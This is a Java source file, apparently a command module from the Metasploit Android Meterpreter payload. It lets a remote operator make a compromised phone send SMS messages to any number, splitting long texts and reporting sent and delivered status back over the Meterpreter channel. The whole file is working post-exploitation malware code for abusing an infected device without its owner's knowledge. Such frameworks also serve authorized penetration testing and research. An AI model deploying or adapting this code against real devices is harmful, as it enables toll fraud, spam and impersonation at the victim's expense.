package com.metasploit.meterpreter.android;

import android.telephony.SmsManager;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.app.Activity;
import android.content.Context;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;


public class android_send_sms implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_SMS_ADDRESS = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9001);
    private static final int TLV_TYPE_SMS_BODY = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9002);
    private static final int TLV_TYPE_SMS_SR = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9021);
    private static final int TLV_TYPE_SMS_DR = TLVPacket.TLV_META_TYPE_BOOL
            | (TLV_EXTENSIONS + 9026);

    Object SMSstatus = new Object();
    Object SMSdelivered = new Object();
    String resultSent, resultDelivered;

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        String number = request.getStringValue(TLV_TYPE_SMS_ADDRESS);
        String message = request.getStringValue(TLV_TYPE_SMS_BODY);
        boolean dr = request.getBooleanValue(TLV_TYPE_SMS_DR);
        SmsManager sm = SmsManager.getDefault();
        String SMS_SENT = "SMS_SENT";
        String SMS_DELIVERED = "SMS_DELIVERED";

        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
        final Context context = androidMeterpreter.getContext();

        // Get the default instance of SmsManager
        SmsManager smsManager = SmsManager.getDefault();

        PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(SMS_SENT), 0);
        PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, 0, new Intent(SMS_DELIVERED), 0);

        // For when the SMS has been sent
        context.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                synchronized (SMSstatus) {
                    resultSent = "";
                    switch(getResultCode()) {
                    case Activity.RESULT_OK:
                        resultSent = "Transmission successful";
                        break;
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        resultSent = "Transmission failed";
                        break;
                    case SmsManager.RESULT_ERROR_RADIO_OFF:
                        resultSent = "Radio off";
                        break;
                    case SmsManager.RESULT_ERROR_NULL_PDU:
                        resultSent = "No PDU defined";
                        break;
                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                        resultSent = "No service";
                        break;
                    }
                    SMSstatus.notifyAll();
                }
            }
        }, new IntentFilter(SMS_SENT));

        // For when the SMS has been delivered
        context.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                synchronized (SMSdelivered) {
                    resultDelivered = "";
                    switch(getResultCode()) {
                    case Activity.RESULT_OK:
                        resultDelivered = "Transmission successful";
                        break;
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        resultDelivered = "Transmission failed";
                        break;
                    case SmsManager.RESULT_ERROR_RADIO_OFF:
                        resultDelivered = "Radio off";
                        break;
                    case SmsManager.RESULT_ERROR_NULL_PDU:
                        resultDelivered = "No PDU defined";
                        break;
                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                        resultDelivered = "No service";
                        break;
                    }
                    SMSdelivered.notifyAll();
                }
            }
        }, new IntentFilter(SMS_DELIVERED));

        if (message.length() > 160) {

            // Break message into 160 character pieces
            int interval = 160;
            int arrayLength = (int) Math.ceil(((message.length() / (double)interval)));
            String[] pieces = new String[arrayLength];
            int j = 0;
            int lastIndex = pieces.length - 1;
            for (int i = 0; i < lastIndex; i++) {
                pieces[i] = message.substring(j, j + interval);
                j += interval;
            }
            pieces[lastIndex] = message.substring(j);
            boolean failed=false;

            // Send all parts of long message
            for (int i = 0; i <= lastIndex; i++) {
                String part=pieces[i];
                smsManager.sendTextMessage(number, null, part, sentPendingIntent, deliveredPendingIntent);
                resultSent=null;
                synchronized (SMSstatus) {
                    while (resultSent == null) {
                        SMSstatus.wait(1000);
                    }
                    if (resultSent != "Transmission successful") {
                        response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
                        failed=true;
                    }
                }
                if (dr) {
                    if (failed==true) {
                        response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
                        return ERROR_SUCCESS;
                    }
                    resultDelivered=null;
                    synchronized (SMSdelivered) {
                        while (resultDelivered == null) {
                            SMSdelivered.wait(1000);
                        }
                        if (resultDelivered != "Transmission successful") {
                            response.addOverflow(TLV_TYPE_SMS_SR,resultDelivered);
                            failed=true;
                        }
                    }
                }
                if (failed==true) {
                    return ERROR_SUCCESS;
                }

            }
            response.addOverflow(TLV_TYPE_SMS_SR, resultSent);

            if (dr) {
                response.addOverflow(TLV_TYPE_SMS_SR, resultDelivered);
            }

        } else {

            // Send a single text based SMS
            smsManager.sendTextMessage(number, null, message, sentPendingIntent, deliveredPendingIntent);
            resultSent=null;
            synchronized (SMSstatus) {
                while (resultSent == null) {
                    SMSstatus.wait(1000);
                }
                response.addOverflow(TLV_TYPE_SMS_SR,resultSent);
            }

            if (dr) {
                resultDelivered=null;
                synchronized (SMSdelivered) {
                    while (resultDelivered == null) {
                        SMSdelivered.wait(1000);
                    }
                    response.addOverflow(TLV_TYPE_SMS_SR,resultDelivered);
                }
            }
        }

        return ERROR_SUCCESS;
    }
}
